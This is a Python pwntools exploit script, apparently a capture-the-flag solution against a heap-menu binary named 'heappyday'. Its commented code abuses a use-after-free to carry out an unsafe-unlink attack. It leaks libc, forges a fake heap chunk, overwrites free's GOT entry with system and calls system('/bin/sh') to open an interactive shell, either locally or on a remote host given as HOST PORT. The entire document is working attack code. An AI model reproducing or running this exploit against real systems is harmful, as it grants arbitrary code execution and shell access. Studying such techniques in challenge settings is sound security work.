# --==[[ unsafe unlink

from pwn import *

array     = 0x6020a0
fd        = array - (3*8)
bk        = array - (2*8)
free_got  = 0x602018
sys_off   = 0x46590
puts_off  = 0x6fd60
sh_off    = 0x180503

def alloc(idx, size, data):

	r.sendlineafter('Exit\n', '1')
	r.sendlineafter('Index: \n', str(idx))
	r.sendlineafter('size: \n', str(size))

	if size > len(data):
		data += '\n'
	r.sendafter('content: \n', data)

	return

def edit(idx, data):

	r.sendlineafter('Exit\n', '2')
	r.sendlineafter('Index: \n', str(idx))
	r.sendlineafter('content: \n', data)

	return

def free(idx):

	r.sendlineafter('Exit\n', '4')
	r.sendlineafter('Index: \n', str(idx))

	return

def dump(idx):

	r.sendlineafter('Exit\n', '3')
	r.sendlineafter('Index: \n', str(idx))

	return u64(r.recv(6).ljust(8, '\x00'))

def pwn():

	alloc(0, 0x230, 'A'*8) # chunk 0
	alloc(1, 0x100, 'B'*8) # chunk 1

	free(0)

	leak   = dump(0)
	libc   = leak - 0x3c27b8
	system = libc + sys_off
	puts   = libc + puts_off
	binsh  = libc + sh_off
	stdin  = libc + 0x3c3640

	log.success("Leak:   0x{:x}".format(leak))
	log.success("Libc:   0x{:x}".format(libc))
	log.success("system: 0x{:x}".format(system))

	# split chunk 0
	alloc(2, 0x100, 'C'*8) # chunk 2
	alloc(3, 0x100, 'D'*8) # chunk 3

	# UAF => unsafe unlink
	#
	# Because of the UAF case, the original chunk 0's
	# size was 0x240. By free-ing it and making 2 allocations 
	# such that chunk 0 gets split, we can call edit
	# on chunk 0 afterwards and craft our fake chunk
	# in order to perform the unsafe unlink attack
	fake_chunk  = p64(0)
	fake_chunk += p64(0x8)
	fake_chunk += p64(fd)
	fake_chunk += p64(bk)
	fake_chunk += 'A'*0xe0
	fake_chunk += p64(0x100)
	fake_chunk += p64(0x110)
	edit(0, fake_chunk)
	
	# unsafe unlink
	free(3)

	payload  = p64(0)
	# stdin's libc address needs to remain as it is
	# since scanf uses it internally, otherwise 
	# the binary will crash
	payload += p64(stdin)
	payload += p64(0)
	payload += p64(free_got)
	payload += p64(binsh)

	edit(0, payload)
	# free => system
	#
	# We need to take care of the null byte termination
	# If we overwrite just the free's GOT entry, the next
	# one (puts) will be null terminated which will cause
	# a crash since puts is called right after
	edit(0, p64(system) + p64(puts))
	
	# system('/bin/sh')
	free(1)

	r.interactive()

if __name__ == "__main__":
    log.info("For remote: %s HOST PORT" % sys.argv[0])
    if len(sys.argv) > 1:
        r = remote(sys.argv[1], int(sys.argv[2]))
        pwn()
    else:
        r = process('./heappyday')
        pause()
        pwn()
